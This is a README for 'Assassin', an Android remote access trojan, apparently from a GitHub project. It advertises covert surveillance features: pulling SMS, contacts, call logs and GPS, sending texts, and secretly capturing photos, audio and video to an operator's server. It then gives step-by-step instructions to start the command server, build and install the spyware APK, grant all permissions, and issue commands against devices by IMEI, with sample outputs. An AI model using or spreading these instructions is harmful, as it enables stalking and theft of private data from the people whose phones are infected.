# Assassin one of the  best Android RAT 
![assassin](https://cdn-std.dprcdn.net/files/acc_737120/k4ywpL)
---- 
- beta 1.0.0
- adapter android Lollipop-Pie
- commit issues to me 

# Construction
![assembleApk](https://cdn-std.dprcdn.net/files/acc_737120/1P2KVt)
# Features
- get Sms_List
- send Sms to destinationAddress
- get Calling_History
- get GPS
- get Contacts_List
---- 
#### something that u can do in background
- call someone  
- take a photo then send to server 
- record audio then send to server
- record video then send to server
</br>of course the duration decided by yourself

# Basement/Environment
- Gradle 
- JDK1.8
- AndroidSdk 
- node.js
- npm
# Usage
```
Options:
  -V, --version             output the version number
  -a,--assassin <assassin>  select a command post to the clients if you choose the shadow you should input the cmd -t to choose a type between pic/audio/video [sms,contacts,call,gps,shadow] (default: "sms")
  -C,--Clients              show every client info
  -d,--address <address>    input a phone num who you want to send a msg
  -m,--msg <msg>            you should write the msg content, if your command is sms
  -t,--type <type>          select a type between pic/audio/video and you should input the -l to choose the camera lens [pic,audio,video]
  -c,--client <client>      select a client to post the command
  -l,--lens <lens>          which camera lens that you want to open [0,1]
  -h, --help                output usage information
```
### *Step.1 clone/download the project  and start up the server*
```
1. git clone git@github.com:honglvt/TalentRAT.git / or download the project yourself on the github
2. cd the project path such as: ~/AndroidProject/ProjectPath/Server/
3. cd Server 
4. npm install
5. npm start
now you can see the terminal console "ASSASSIN"
```
### *Step.2 build assasin.apk with shell at project folder*
befor build the apk
- confrim that you have prepare the env for building the app
- connect the android device  to ur PC
- enable the develop mode on ur android device 
if you can not do *step.2* and *step.3*  you can build the *assassin.apk* and install it to your device manually 
now let's start assembleApk
```
at the first time when you download the project you should confirm your OS type mac or linux, 
and get your server IPAdress by "ifconfig/ipconfig" 
0.  chmod 777 ./assembleApk.sh
    chmod 777 ./installNewestApk.sh
1.  execute the assemble shell  "./assaembleApk.sh OS serverIP"        
    serverIP type as 127.0.0.1:3000   
    OS type as mac or linux
    as follows:
    "./assembleApk.sh mac 127.0.0.1:3000"
    "./assembleApk.sh linux localHost:3000"
2.  ./installNewestApk.sh
    if you are not able to connect the device to your PC, send the apk by email or xx and install it manually
3.  look at your device, the apk has been installed into your device
    run it 
    grant all of permissions 
    and now you can see { a user connected info }at terminal you have opened at Step.1
```
### *Step.3 execute command，then you will get whaterver you want!!!*
| cmd        |  ./assassin.js -a sms -c 9910294050493  |
| ---------- | :-----------:  |
| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video|

#### ***args with -c can be gotten at server terminal {a user connected info}***
#### ***type the cmd into a new terminal at ~/project/Server***
and the result:
```
{
    "command": "send_contacts_list",
    "IMEI": "99001249798100"
}
response is : 
[{name:ASX,phoneNum:2345 67}]
```
### exemples
| cmd        | -a     |
| ---------- | :-----------:  | 
| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video     | 
|  example   | ‘’./assassin.js -a sms‘’  ‘’ ./assassin.js -a shadow -t pic ‘’   | 
|  result   | ERROR:you should input a type with -c to choose a client that you want to send cmd    | 
----

| cmd        | -C     |
| ---------- | :-----------:  | 
| description| show every client info    | 
|  example   | ‘’./assassin.js -C ‘’   | 
|  result   | {IMEI:9525238415950202,brand:Nokia,model:CAL-20,version:9.0}   | 
----

| cmd        | -c     |
| ---------- | :-----------:  | 
| description| select a client with its IMEI to post the command    | 
|  example   | ‘’./assassin.js -a sms -c  9525238415950202 ‘’   | 
|  result   | { command: 'send_sms_list', IMEI: '184859203' }  | 
----

# Prompt

- keep node server alive when you send a command
- cmd with ./assassin.js will return a Json data  you can do whatever with the response 
- if you want to get a pic or video you should type the cmd as follow:
  - ./assassin.js -a shadow -c 123456 -t pic -l 0
  - then you can find the pic has saved on the */project/Server/public/images/xxxx.jpeg'
  - the same with other shadow
- the duration in recording video or audio decided by yourself

# Screen Shot
### server
![server](https://cdn-std.dprcdn.net/files/acc_737120/tKCGxc)
---
### assembleApk
![assembleApk](https://cdn-std.dprcdn.net/files/acc_737120/BtN0Eb)
---
### installApk
![installApk](https://cdn-std.dprcdn.net/files/acc_737120/qzZ6yC)
---
### client connect to server
![connect](https://cdn-std.dprcdn.net/files/acc_737120/7AfwLH)
---
### executeCmd
![executeCmd](https://cdn-std.dprcdn.net/files/acc_737120/ot6gOq)
